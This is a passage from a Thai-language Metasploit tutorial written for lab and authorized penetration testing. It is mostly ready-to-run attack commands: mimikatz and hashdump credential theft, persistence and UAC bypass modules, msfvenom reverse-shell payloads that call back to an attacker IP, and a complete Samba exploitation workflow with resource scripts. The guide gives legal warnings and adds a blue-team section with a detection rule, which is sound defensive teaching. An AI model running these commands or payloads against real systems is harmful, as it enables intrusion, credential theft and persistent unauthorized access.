### Meterpreter — โหลด extension (เพิ่มความสามารถ)

```
load kiwi               # โหลด mimikatz (ดึง credential ขั้นสูง)
creds_all               # (หลัง load kiwi) ดึง credential ทั้งหมด
lsa_dump_sam            # dump SAM
load stdapi             # โหลด stdapi (ปกติโหลดอัตโนมัติ)
load python             # รัน python ในเป้าหมาย
python_execute "import os; print(os.getcwd())"
load extapi             # extended API
```

### Meterpreter — รันคำสั่ง/โปรเซส

```
execute -f cmd.exe -i           # รันโปรแกรมและโต้ตอบ
execute -f notepad.exe -H       # รันแบบซ่อน
getenv PATH                     # อ่าน environment variable
shell                           # เข้า system shell
```

### Meterpreter — เวลาไฟล์ (timestomp) และ registry (Windows)

```
timestomp file.txt -v           # ดู timestamp ไฟล์
reg enumkey -k HKLM\\Software    # แจกแจง registry key
reg queryval -k HKLM\\Software\\X -v Value
```

### Meterpreter — help / info ในตัว

```
help                    # คำสั่งทั้งหมด
background              # พัก session
exit                   # ปิด session
```

> **หลัง session:** ใช้ `help` ภายใน meterpreter เพื่อดูคำสั่งทั้งหมดของเวอร์ชันนั้น
> (คำสั่งอาจต่างกันตาม payload/OS — Windows meterpreter มีคำสั่งมากกว่า Linux)

---

## 12.1 msfrpcd — Automation ผ่าน RPC

Metasploit มี RPC server สำหรับควบคุมด้วยสคริปต์ (Python/Ruby) หรือเชื่อม GUI

```bash
# เปิด RPC server (ตั้งรหัสผ่าน)
msfrpcd -P mypassword -S -a 127.0.0.1 -p 55553
#   -P รหัสผ่าน  -S ปิด SSL (ในแล็บ)  -a bind address  -p port

# เชื่อมด้วย msfrpc (client ในตัว)
msfrpc -P mypassword -a 127.0.0.1 -p 55553
```

**ควบคุมด้วย Python (pymetasploit3):**

```bash
pip install pymetasploit3
python3 - <<'PY'
from pymetasploit3.msfrpc import MsfRpcClient
client = MsfRpcClient('mypassword', server='127.0.0.1', port=55553, ssl=False)
print("modules:", len(client.modules.exploits))
# ตัวอย่าง: ตั้ง handler ผ่าน RPC
PY
```

---

## 13. Post-Exploitation Modules

โมดูล `post/` ทำงานอัตโนมัติหลังได้ session (ตั้ง `SESSION` เป็นหมายเลข session)

### รูปแบบทั่วไป

```
use post/windows/gather/hashdump
set SESSION 1
run
```

### Windows — เก็บข้อมูล

```
use post/windows/gather/hashdump                     # ดึง hash
use post/windows/gather/credentials/credential_collector
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm                      # ตรวจว่าเป็น VM ไหม
use post/windows/gather/enum_applications            # แอปที่ติดตั้ง
use post/windows/manage/migrate                      # ย้ายโปรเซส
```

### Linux — เก็บข้อมูล

```
use post/linux/gather/hashdump
use post/linux/gather/enum_configs
use post/linux/gather/enum_system
use post/multi/gather/ssh_creds
```

### รันโมดูล post จากใน meterpreter โดยตรง

```
# ขณะอยู่ใน meterpreter session:
run post/windows/gather/enum_logged_on_users
run post/multi/recon/local_exploit_suggester   # แนะนำช่องโหว่ยกสิทธิ์
```

### local_exploit_suggester (แนะนำวิธียกสิทธิ์)

```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### Persistence (ต้องได้รับอนุญาตชัดเจน — กระทบระบบเป้าหมาย)

```
use exploit/windows/local/persistence_service
set SESSION 1
set LHOST 10.0.0.1
set LPORT 4444
run

use post/windows/manage/persistence_exe
use post/linux/manage/sshkey_persistence
```

### เก็บ credential / ยกสิทธิ์ (Windows)

```
use post/windows/gather/smart_hashdump           # dump hash ฉลาดขึ้น
use exploit/windows/local/bypassuac              # เลี่ยง UAC
set SESSION 1
run
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

### เก็บข้อมูลเครือข่าย/ระบบ (multi-platform)

```
use post/multi/gather/env                        # environment variables
use post/multi/gather/firefox_creds              # credential ใน Firefox
use post/multi/manage/shell_to_meterpreter       # อัปเกรด shell → meterpreter
set SESSION 1
run
```

### ตารางโมดูล post ที่ใช้บ่อย

| โมดูล | หน้าที่ |
|---|---|
| `post/multi/recon/local_exploit_suggester` | แนะนำ exploit ยกสิทธิ์ |
| `post/windows/gather/hashdump` | ดึง hash รหัสผ่าน |
| `post/windows/gather/smart_hashdump` | dump hash แบบฉลาด |
| `post/multi/manage/shell_to_meterpreter` | อัปเกรด shell |
| `post/windows/manage/migrate` | ย้ายโปรเซส |
| `post/multi/gather/ssh_creds` | เก็บ SSH key |

---

## 14. Resource Script และการทำงานอัตโนมัติ

Resource script (`.rc`) = ชุดคำสั่ง msfconsole ที่รันต่อเนื่อง เหมาะกับงานซ้ำ ๆ

### สร้างและรัน (ทดสอบแล้ว)

```bash
cat > scan.rc <<'RC'
workspace -a lab01
db_nmap -sV 10.0.0.0/24
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.0/24
run
hosts
services
RC
msfconsole -q -r scan.rc
```

### เรียก resource script จากในคอนโซล

```
msf6 > resource scan.rc
msf6 > makerc /tmp/mycommands.rc     # บันทึกคำสั่งที่พิมพ์ทั้ง session ลงไฟล์
```

### รันคำสั่งตรง ๆ ด้วย -x (ทดสอบแล้ว)

```bash
msfconsole -q -x "db_status; workspace; exit"
msfconsole -q -x "search cve:2021 rank:excellent; exit"
```

### ERB / คำสั่งแบบมีเงื่อนไข ใน .rc

```
<ruby>
  framework.hosts.each do |h|
    print_status("Host: #{h.address}")
  end
</ruby>
```

### AutoRunScript (รันสคริปต์อัตโนมัติเมื่อได้ session)

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set AutoRunScript "post/windows/manage/migrate"
run
```

---

## 15. เครื่องมือ Exploit Dev (pattern/BOF)

เครื่องมือช่วยพัฒนา exploit (buffer overflow) — บน Kali มาในแพ็กเกจ `metasploit-framework`

### สร้าง/หา offset ของ pattern (คำสั่ง Kali)

```bash
# สร้าง cyclic pattern ยาว 400 ไบต์
msf-pattern_create -l 400

# หา offset จากค่าที่ EIP/RIP ถูกเขียนทับ (เช่น 0x41326141)
msf-pattern_offset -q 41326141
msf-pattern_offset -l 400 -q 41326141
```

> **หมายเหตุการทดสอบ:** ตรรกะ pattern_create/offset ทดสอบผ่าน tool ภายใน framework แล้ว
> (สร้าง `Aa0Aa1Aa2...` และหา exact match offset ได้) บน Kali เรียกผ่าน `msf-pattern_create`/`msf-pattern_offset`
> ถ้าติดตั้งด้วย omnibus อาจไม่มี wrapper นี้ ให้ใช้ผ่าน `ruby <framework>/tools/exploit/pattern_create.rb`

### เครื่องมืออื่น

```bash
msf-nasm_shell            # แปลง assembly → opcode (หา JMP ESP ฯลฯ)
msf-egghunter             # สร้าง egghunter shellcode
msf-virustotal -f shell.exe   # เช็คไฟล์กับ VirusTotal (ต้องมี API key)
msf-metasm_shell          # assembler/disassembler
```

### หา JMP ESP / gadget ในไฟล์ (msfrop/msfelfscan)

```bash
msfelfscan -j esp target.elf      # หา jump esp ใน ELF
msfpescan -j esp target.exe       # หา jump esp ใน PE (Windows)
msfrop -v target.bin              # หา ROP gadgets
```

### โครง exploit BOF (pwntools + msfvenom shellcode)

```bash
# สร้าง shellcode (C array) จาก msfvenom
msfvenom -p linux/x64/exec CMD=/bin/sh -b '\x00' -f py -v sc
# แล้วประกอบใน exploit ด้วย pwntools (ดูไฟล์ skill exploit-dev)
```

---

## 16. สร้างแล็บฝึก (Metasploitable/DVWA)

ฝึกกับ **เป้าหมายที่ตั้งใจให้ฝึก** เท่านั้น — ห้ามยิงระบบจริง

### ตัวเลือกเป้าหมายในแล็บ

| เป้าหมาย | คือ | วิธีได้มา |
|---|---|---|
| **Metasploitable 2/3** | Linux เต็มไปด้วยช่องโหว่ | VM image (VirtualBox/VMware) |
| **DVWA** | เว็บช่องโหว่ | Docker: `docker run -p 80:80 vulnerables/web-dvwa` |
| **OWASP Juice Shop** | เว็บ modern | Docker: `docker run -p 3000:3000 bkimminich/juice-shop` |
| **VulnHub** | VM ช่องโหว่หลากหลาย | ดาวน์โหลดฟรี |

### รัน DVWA ด้วย Docker บน WSL

```bash
sudo apt -y install docker.io
sudo service docker start
sudo docker run -d -p 80:80 vulnerables/web-dvwa
# เปิด http://127.0.0.1 (login admin/password)
```

### เครือข่ายแล็บบน WSL — หา IP ตัวเอง

```bash
ip addr show eth0 | grep inet          # IP ของ Kali (WSL)
hostname -I                            # IP ทั้งหมด
```

> **ข้อควรระวัง WSL:** WSL2 ใช้ NAT — เครื่องอื่นในเครือข่ายอาจต่อกลับ WSL ไม่ได้ตรง ๆ
> สำหรับ reverse shell ในแล็บ ให้ทดสอบภายใน WSL เอง หรือใช้ `localhost`/Docker network

---

## 17. เดินเครื่องเต็มรูปแบบ (workflow ตัวอย่าง)

ตัวอย่างครบวงจรในแล็บ (เป้าหมายสมมติ `10.0.0.5`, ผู้โจมตี `10.0.0.1`)

### ขั้น 1 — เตรียม workspace + สแกน

```bash
msfconsole -q
```

```
workspace -a lab_demo
db_nmap -sV -p- 10.0.0.5
hosts
services
```

### ขั้น 2 — แจกแจงบริการ

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.5
run
```

### ขั้น 3 — ค้นและเลือก exploit

```
search type:exploit platform:linux samba
use exploit/multi/samba/usermap_script
info
show options
set RHOSTS 10.0.0.5
```

### ขั้น 4 — ตั้ง payload + เช็ค + ยิง

```
set PAYLOAD cmd/unix/reverse
set LHOST 10.0.0.1
set LPORT 4444
check
show options
exploit
```

### ขั้น 5 — จัดการ session

```
# หลังได้ shell:
sessions -l
sessions -i 1
# ยกระดับเป็น meterpreter:
sessions -u 1
```

### ขั้น 6 — post-exploitation

```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### เวอร์ชัน resource script ของ workflow นี้

```bash
cat > demo.rc <<'RC'
workspace -a lab_demo
use exploit/multi/samba/usermap_script
set RHOSTS 10.0.0.5
set PAYLOAD cmd/unix/reverse
set LHOST 10.0.0.1
set LPORT 4444
exploit -z
RC
msfconsole -q -r demo.rc
```

---

## 18. มุมมอง Blue Team: ตรวจจับ Metasploit

ในกรอบ Purple Team — เข้าใจว่า Metasploit ทิ้งร่องรอยอะไร เพื่อสร้างการตรวจจับ

### สัญญาณที่ Blue ตรวจได้

| สัญญาณ | ตรวจที่ไหน |
|---|---|
| Meterpreter default cert/JA3 | TLS fingerprint บน network |
| `reverse_tcp` callback ไปพอร์ตแปลก ๆ | firewall/netflow (พอร์ต 4444 เป็น default ที่รู้จัก) |
| Payload ที่ไม่ได้เข้ารหัส | AV signature (msfvenom default โดน AV จับง่าย) |
| `psexec`-style service creation | Windows Event ID 7045 |
| Named pipe ของ meterpreter | Sysmon |

### ตรวจ payload ที่สร้างว่า AV จับได้ไหม (ฝั่ง Blue audit ตัวเอง)

```bash
# สแกนไฟล์ที่สร้างด้วย clamav (บน WSL)
sudo apt -y install clamav && sudo freshclam
clamscan shell.exe

# นับ entropy สูง (payload ที่เข้ารหัสมัก entropy สูง)
python3 -c "import math,sys,collections;d=open(sys.argv[1],'rb').read();c=collections.Counter(d);e=-sum(n/len(d)*math.log2(n/len(d)) for n in c.values());print('entropy=%.2f'%e)" shell.exe
```

### Snort/Suricata rule (แนวคิด) จับ meterpreter default

```
alert tcp any any -> any 4444 (msg:"Possible Metasploit default reverse_tcp"; \
  flow:established; classtype:trojan-activity; sid:1000001; rev:1;)
```

### คำสั่ง Blue: หา listener/connection ผิดปกติบนโฮสต์

```bash
ss -tulpn | grep -E ":4444|:4445"        # หา listener พอร์ต default
netstat -antp 2>/dev/null | grep ESTABLISHED
```

> **หลัก Purple:** เมื่อรัน MSF ในแล็บ ให้บันทึกว่าใช้พอร์ต/payload อะไร แล้วตรวจว่า SIEM/IDS
> จับได้ไหม → ถ้าไม่จับ = ช่องว่างที่ต้องเขียน detection

---

## 19. แก้ปัญหาบน WSL (Troubleshooting)

| อาการ | วิธีแก้ |
|---|---|
| `Please run msfdb as a non-root user` | รัน `msfdb init` ด้วย user ปกติ ไม่ใช่ sudo/root |
| `postgresql selected, no connection` | `sudo service postgresql start` แล้ว `msfdb init` |
| PostgreSQL ไม่ start (WSL ไม่มี systemd) | ใช้ `sudo service postgresql start` ไม่ใช่ `systemctl` |
| `msfconsole` ช้าตอนเปิด | `msfdb init` ให้เชื่อม DB (ทำให้ search เร็วขึ้น) |
| reverse shell ต่อกลับไม่ได้ | WSL2 เป็น NAT — ทดสอบใน WSL เอง/Docker หรือ config port proxy บน Windows |
| หา IP WSL ไม่เจอ | `ip addr show eth0` หรือ `hostname -I` |
| `msf-pattern_create: command not found` | ติดตั้งด้วย apt ของ Kali (omnibus ไม่มี wrapper นี้) |
| DB error หลังรีสตาร์ต WSL | `sudo service postgresql start; msfdb start` |
| เวลาเพี้ยน (cert error) | `sudo hwclock -s` หรือ `wsl --shutdown` แล้วเปิดใหม่ |

### port proxy บน Windows (ให้เครื่องนอกต่อ reverse shell กลับ WSL)

```powershell
# รันบน Windows PowerShell (Admin) — forward พอร์ต 4444 จาก Windows → WSL
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=$(wsl hostname -I)
# ลบภายหลัง:
netsh interface portproxy delete v4tov4 listenport=4444 listenaddress=0.0.0.0
```

---

## 20. Cheat Sheet — สรุปคำสั่งทั้งหมด

```bash
# ===== ติดตั้ง + DB =====
sudo apt -y install metasploit-framework
sudo service postgresql start
msfdb init                                        # รันแบบ non-root
msfconsole -q -x "db_status; exit"

# ===== console (ไม่โต้ตอบ) =====
msfconsole -q                                     # เปิดเงียบ
msfconsole -q -x "search eternalblue; exit"       # รันคำสั่งแล้วออก
msfconsole -q -r script.rc                        # รัน resource script

# ===== ภายใน console =====
# search type:exploit platform:windows cve:2017 rank:excellent
# use exploit/windows/smb/ms17_010_eternalblue
# info ; show options ; show targets ; show payloads
# set RHOSTS 10.0.0.5 ; set LHOST 10.0.0.1 ; set LPORT 4444
# setg RHOSTS 10.0.0.5 ; check ; exploit ; run -j
# sessions -l ; sessions -i 1 ; background ; jobs ; jobs -K

# ===== database =====
# workspace -a lab ; db_nmap -sV 10.0.0.0/24 ; hosts ; services ; creds ; loot
# db_import scan.xml ; db_export -f xml out.xml

# ===== msfvenom =====
msfvenom --list payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o s.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o s.elf
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -f raw -o s.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o s.war
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o e.exe
msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.1 LPORT=4444 -f raw

# ===== handler =====
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run"

# ===== exploit dev (Kali) =====
msf-pattern_create -l 400
msf-pattern_offset -q 41326141
msfelfscan -j esp target.elf
```

**ตารางคำสั่ง console ที่ใช้บ่อย:**

| คำสั่ง | หน้าที่ |
|---|---|
| `search` | ค้นโมดูล (มี filters) |
| `use` | เลือกโมดูล |
| `info` / `show options` | ดูข้อมูล/ตัวเลือก |
| `set` / `setg` / `unset` | ตั้ง/ล้างค่า |
| `check` | เช็คช่องโหว่โดยไม่เจาะ |
| `exploit` / `run` | รันโมดูล |
| `run -j` / `jobs` | รัน background / ดู job |
| `sessions` / `sessions -i` | จัดการ/เข้า session |
| `background` | พัก session |
| `db_nmap` / `hosts` / `services` | สแกน/ดูข้อมูล DB |
| `workspace` | จัดการ workspace |
| `resource` / `makerc` | รัน/บันทึกสคริปต์ |

---

## 21. ความเสี่ยงที่ยังเหลืออยู่ (Residual Risks)

> ไม่มีเครื่องมือหรือกระบวนการใดปลอดภัยสมบูรณ์ — ต่อไปนี้คือความเสี่ยงที่ยังคงอยู่

1. **กฎหมาย (สูงสุด)** — Metasploit เจาะระบบได้จริง ใช้กับระบบที่ไม่ได้รับอนุญาต **ผิดกฎหมายชัดเจน**
   (พ.ร.บ.คอมพิวเตอร์ฯ/CFAA) ใช้เฉพาะแล็บของตัวเอง หรือมีเอกสารอนุญาต
2. **payload คือมัลแวร์จริง** — ไฟล์จาก msfvenom เป็น payload ที่ทำงานได้จริง อย่ารัน/ส่งนอกแล็บ
   เก็บแยก เข้ารหัส และลบเมื่อจบ; อย่า commit ขึ้น git
3. **ยิงผิดเป้า/นอก scope** — ตรวจ `RHOSTS` ทุกครั้งก่อน `exploit`; หลีกเลี่ยง subnet กว้างโดยไม่ตั้งใจ
4. **exploit ทำระบบล่ม** — บาง exploit (โดยเฉพาะ rank ต่ำ) ทำเป้าหมาย crash — ใช้ `check` ก่อน และ
   หลีกเลี่ยงในระบบ production
5. **การเปิดเผยตัว** — reverse shell เผย IP/พอร์ตของผู้ทดสอบ; ในงานจริงต้องอยู่ใน RoE และ deconflict
6. **DB/ผลลัพธ์คือข้อมูลอ่อนไหว** — hosts/creds/loot มีข้อมูลเป้าหมาย เข้ารหัสและจำกัดการเข้าถึง
7. **AV/EDR bypass** — เทคนิคหลบเลี่ยงมีไว้เพื่อ "ทดสอบการป้องกัน" ในงานที่ได้รับอนุญาตเท่านั้น
   ไม่ใช่เพื่อหลบหนีการตรวจจับโดยมุ่งร้าย
8. **ความเข้ากันของ WSL** — WSL2 NAT ทำให้ reverse connection จากภายนอกยุ่งยาก; วางแผน network ของแล็บ
   ให้ชัดก่อนทดสอบ

> **บทสรุป:** คู่มือนี้ให้คำสั่ง Metasploit ที่ **ทดสอบแล้วว่าใช้ได้** เพื่อ **การศึกษาและการทดสอบ
> ที่ได้รับอนุญาต** — Metasploit เป็นเครื่องมือของทั้งฝ่ายรุกและฝ่ายรับ ใช้เพื่อ *เข้าใจและยกระดับ
> การป้องกัน* ในสภาพแวดล้อมที่คุณมีสิทธิ์เท่านั้น

---

> จบคู่มือ Metasploit — ดูคู่มือชุด OSINT ที่เกี่ยวข้อง:
> [1: SpiderFoot](./spiderfoot-email-osint-th.md) ·
> [2: Email ขั้นสูง](./spiderfoot-email-osint-advanced-th.md) ·
> [3: ชื่อ/เบอร์ Red/Purple](./osint-name-phone-redteam-th.md)
